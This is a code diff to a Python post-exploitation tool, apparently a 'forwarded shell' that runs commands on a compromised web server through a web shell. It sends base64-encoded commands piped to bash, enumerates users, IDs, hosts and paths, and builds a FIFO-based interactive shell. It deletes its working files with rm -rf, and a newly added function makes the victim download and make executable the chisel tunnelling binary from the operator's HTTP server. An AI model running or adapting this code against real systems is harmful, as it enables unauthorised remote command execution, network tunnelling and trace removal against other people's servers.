@@ -24,7 +24,9 @@ mybanner = '''\n              /\                               ______,....----,
 `^^^^^^^^^^^^^^|======================----------""""""
               \/'''
 
-global infile, outfile, local_http_port, server
+# Global Variables
+global infile, outfile, local_http_port, server, local_ip
+local_ip="127.0.0.1"
 mod = randrange(1, 9999)
 local_http_port = randrange(40000, 50000)
 server = HTTPServer(('localhost', local_http_port), SimpleHTTPRequestHandler)
@@ -53,15 +55,15 @@ signal.signal(signal.SIGINT, exit_handler)
 
 # Remove input and output files at the exit
 def removeFiles(url, parameter):
-	removeCommand = """rm -rf /dev/shm/.fs/"""
-	base64command = b64encode(removeCommand.encode()).decode()
+    removeCommand = """rm -rf /dev/shm/.fs/"""
+    base64command = b64encode(removeCommand.encode()).decode()
     
-	removeData = {
-		f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
-	}
+    removeData = {
+        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
+    }
     
-	print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Removing created files\n" + c.END)
-	r = requests.post(url, data=removeData, timeout=2)
+    print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Removing created files" + c.END)
+    r = requests.post(url, data=removeData, timeout=5)
     
 # Argument Parser Function
 def parseArgs():
@@ -83,9 +85,9 @@ def checkConn(url):
 # To forward a port to your localhost
 def createHttp():   
 	
-	thread = threading.Thread(target = server.serve_forever)
-	thread.daemon = True
-	thread.start()
+    thread = threading.Thread(target = server.serve_forever)
+    thread.daemon = True
+    thread.start()
 	
 # Function to create the fifos on the victim (to have an interactive tty)
 def createFifos(url, parameter):
@@ -162,149 +164,171 @@ def checkBinaries(url, parameter):
 
 # Function to enumerate the system
 def enumSys(url, parameter):
-	raw_command = """whoami"""
-	base64command = b64encode(raw_command.encode()).decode()
+    raw_command = """whoami"""
+    base64command = b64encode(raw_command.encode()).decode()
 
-	enum_data = {
-		f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
-	}
+    enum_data = {
+        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
+    }
 
-	r = requests.post(url, data=enum_data)
-	user = r.text
+    r = requests.post(url, data=enum_data, timeout=2)
+    user = r.text
 
-	raw_command = """hostname"""
-	base64command = b64encode(raw_command.encode()).decode()
+    raw_command = """hostname"""
+    base64command = b64encode(raw_command.encode()).decode()
 
-	enum_data = {
-		f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
-	}
+    enum_data = {
+        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
+    }
 
-	r = requests.post(url, data=enum_data)
-	hostname = r.text
+    r = requests.post(url, data=enum_data, timeout=2)
+    hostname = r.text
 
-	raw_command = """hostname -I"""
-	base64command = b64encode(raw_command.encode()).decode()
+    raw_command = """hostname -I"""
+    base64command = b64encode(raw_command.encode()).decode()
 
-	enum_data = {
-		f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
-	}
+    enum_data = {
+        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
+    }
 
-	r = requests.post(url, data=enum_data)
-	ip = r.text
+    r = requests.post(url, data=enum_data, timeout=2)
+    ip = r.text
 
-	raw_command = """uname -a"""
-	base64command = b64encode(raw_command.encode()).decode()
+    raw_command = """uname -a"""
+    base64command = b64encode(raw_command.encode()).decode()
 
-	enum_data = {
-		f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
-	}	
+    enum_data = {
+        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
+    }	
 
-	r = requests.post(url, data=enum_data)
-	uname = r.text
+    r = requests.post(url, data=enum_data, timeout=2)
+    uname = r.text
 
-	raw_command = """id"""
-	base64command = b64encode(raw_command.encode()).decode()
+    raw_command = """id"""
+    base64command = b64encode(raw_command.encode()).decode()
 
-	enum_data = {
-		f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
-	}
+    enum_data = {
+        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
+    }
 
-	r = requests.post(url, data=enum_data)
-	id_output = r.text
+    r = requests.post(url, data=enum_data, timeout=2)
+    id_output = r.text
 
-	raw_command = """ls /home"""
-	base64command = b64encode(raw_command.encode()).decode()
+    raw_command = """ls /home"""
+    base64command = b64encode(raw_command.encode()).decode()
 
-	enum_data = {
-		f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
-	}
+    enum_data = {
+        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
+    }
 
-	r = requests.post(url, data=enum_data)
-	users = r.text
+    r = requests.post(url, data=enum_data, timeout=2)
+    users = r.text
+    users = users.strip('\n').replace('\n', ', ')
+    
+    raw_command = """echo $PATH"""
+    base64command = b64encode(raw_command.encode()).decode()
 
-	raw_command = """echo $PATH"""
-	base64command = b64encode(raw_command.encode()).decode()
+    enum_data = {
+        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
+    }
 
-	enum_data = {
-		f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
-	}
+    r = requests.post(url, data=enum_data, timeout=2)
+    path = r.text
 
-	r = requests.post(url, data=enum_data)
-	path = r.text
+    return user, hostname, ip, uname, id_output, users, path
 
-	return user, hostname, ip, uname, id_output, users, path
+def downloadChisel(url, parameter):
+    raw_command = f"""curl http://{local_ip}:{local_http_port}/utils/chisel -o /dev/shm/.fs/chisel"""
+    base64command = b64encode(raw_command.encode()).decode()
+
+    download_data = {
+            f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
+    }
+
+    r = requests.post(url, data=download_data, timeout=4)
+
+    raw_command = """chmod +x /dev/shm/.fs/chisel"""
+    base64command = b64encode(raw_command.encode()).decode()
+
+    download_data = {
+        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
+    }
+
+    r = requests.post(url, data=download_data, timeout=4)
 
 # Main Function
 if __name__ == '__main__':
 
-	# Parse arguments and declare variables
-	parse = parseArgs()
+    # Parse arguments and declare variables
+    parse = parseArgs()
 
-	url = parse.url
-	parameter = parse.parameter
+    url = parse.url
+    parameter = parse.parameter
 
-	# Print banner
-	print(c.YELLOW + mybanner + c.END)
+    # Print banner
+    print(c.YELLOW + mybanner + c.END)
 
-	# Check connection to the web shell
-	checkConn(url)
-	createHttp()
+    # Check connection to the web shell
+    checkConn(url)
+    createHttp()
 	
-	# Create an interactive shell
-	createFifos(url, parameter)
+    # Create an interactive shell
+    createFifos(url, parameter)
+    print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Getting system info" + c.END)
+    user, hostname, ip, uname, id_output, users, path = enumSys(url, parameter)
 
-	# Enumerate system
-	print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Getting system information..." + c.END)
-	user, hostname, ip, uname, id_output, users, path = enumSys(url, parameter)
-	print(c.YELLOW + "\nInformation" + c.END)
-	print(c.YELLOW + "-----------" + c.END)
-	print(c.BLUE + "User: " + user.strip('\n') + c.END)
-	print(c.BLUE + "ID and groups: " + id_output.strip('\n') + c.END)
-	print(c.BLUE + "Path: " + path.strip('\n') + c.END)
-	print(c.BLUE + "Hostname: " + hostname.strip('\n') + c.END)
-	print(c.BLUE + "IP: " + ip.strip('\n') + c.END)
-	print(c.BLUE + "Users in /home: " + users.strip('\n') + c.END)
-	print(c.BLUE + "System info: " + uname.strip('\n') + c.END)
+    print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Type dfs-help to see a list of custom commands of this forwarded shell\n" + c.END)
     
-	binList = checkBinaries(url, parameter)
-	print(c.YELLOW + "\nUseful binaries" + c.END)
-	print(c.YELLOW + "---------------" + c.END)
-	print(c.BLUE + binList + c.END)
-
-	print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Type exit-shell to quit from the forwarded shell\n" + c.END)
-    
-	customCommands = ["dfs-enum", "enum-dfs", "dfs-exit", "exit-dfs", "dfs-forward", "forward-dfs"]
-	# Loop to execute commands
-	while True:
-		if user == "root":
-			command_to_exec = input(user.strip('\n') + "@" + hostname.strip('\n') + ":~# ")
-		else:
-			command_to_exec = input(user.strip('\n') + "@" + hostname.strip('\n') + ":~$ ")
+    customCommands = ["dfs-help", "help-dfs", "dfs-enum", "enum-dfs", "dfs-exit", "exit-dfs", "dfs-forward", "forward-dfs"]
+    # Loop to execute commands
+    while True:
+        if user == "root":
+            command_to_exec = input(user.strip('\n') + "@" + hostname.strip('\n') + ":~# ")
+        else:
+            command_to_exec = input(user.strip('\n') + "@" + hostname.strip('\n') + ":~$ ")
         
-		if command_to_exec == "dfs-enum" or command_to_exec == "enum-dfs":
-	          user, hostname, ip, uname, id_output, users, path = enumSys(url, parameter)
-	          print(c.YELLOW + "\nInformation" + c.END)
-	          print(c.YELLOW + "-----------" + c.END)
-	          print(c.BLUE + "User: " + user.strip('\n') + c.END)
-	          print(c.BLUE + "ID and groups: " + id_output.strip('\n') + c.END)
-	          print(c.BLUE + "Path: " + path.strip('\n') + c.END)
-	          print(c.BLUE + "Hostname: " + hostname.strip('\n') + c.END)
-	          print(c.BLUE + "IP: " + ip.strip('\n') + c.END)
-	          print(c.BLUE + "Users in /home: " + users.strip('\n') + c.END)
-        	  print(c.BLUE + "System info: " + uname + c.END) 
-            
-		if command_to_exec == "dfs-exit" or command_to_exec == "exit-dfs":
-			removeFiles(url, parameter)
-			print(c.BLUE + "[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Exiting from shell, bye!" + c.END)
-			sys.exit(0)
+        if command_to_exec == "dfs-help" or command_to_exec == "help-dfs":
+            print(c.YELLOW + "\nCommands\t\tDescription" + c.END)
+            print(c.YELLOW + "--------\t\t-----------" + c.END)
+            print(c.BLUE + "dfs-enum\t\tenumerate common things of the system (users, groups...)" + c.END)
+            print(c.BLUE + "dfs-binaries\t\tsearch common useful binaries that can be used in the pentest" + c.END)
+            print(c.BLUE + "dfs-exit\t\texit from the forwarded shell and delete created files on the target" + c.END)
+            print(c.BLUE + "dfs-forward\t\tforwards a intern port of the target to your machine (not implemented yet)\n" + c.END)
+
+        if command_to_exec == "dfs-enum" or command_to_exec == "enum-dfs":
+            print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Enumerating system, please wait a few seconds" + c.END)
+            user, hostname, ip, uname, id_output, users, path = enumSys(url, parameter)
+            print(c.YELLOW + "\nInformation" + c.END)
+            print(c.YELLOW + "-----------" + c.END)
+            print(c.BLUE + "User: " + user.strip('\n') + c.END)
+            print(c.BLUE + "ID and groups: " + id_output.strip('\n') + c.END)
+            print(c.BLUE + "Path: " + path.strip('\n') + c.END)
+            print(c.BLUE + "Hostname: " + hostname.strip('\n') + c.END)
+            print(c.BLUE + "IP: " + ip.strip('\n') + c.END)
+            print(c.BLUE + "Users in /home: " + users + c.END)
+            print(c.BLUE + "System info: " + uname + c.END) 
+
+        if command_to_exec == "dfs-binaries" or command_to_exec == "binaries-dfs":
+            binList = checkBinaries(url, parameter)
+            print(c.YELLOW + "\nUseful binaries" + c.END)
+            print(c.YELLOW + "---------------" + c.END)
+            print(c.BLUE + binList.strip('\n') + c.END)
+
+        if command_to_exec == "dfs-forward" or command_to_exec == "forward-dfs":
+            print("not implemented yet\n")
+
+        if command_to_exec == "dfs-exit" or command_to_exec == "exit-dfs":
+            removeFiles(url, parameter)
+            print(c.BLUE + "\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Exiting from shell, bye!\n" + c.END)
+            sys.exit(0)
 		
-		if command_to_exec not in customCommands:
-			execCommand(url, parameter, command_to_exec + "\n")
-			# Read command output
-			resp = readCommand(url, parameter)
-			# Print command output
-			print(resp)
-			# Clear the file of the output
-			clearOutput(url, parameter)
+        if command_to_exec not in customCommands:
+            execCommand(url, parameter, command_to_exec + "\n")
+            # Read command output
+            resp = readCommand(url, parameter)
+            # Print command output
+            print(resp)
+            # Clear the file of the output
+            clearOutput(url, parameter)
 
 
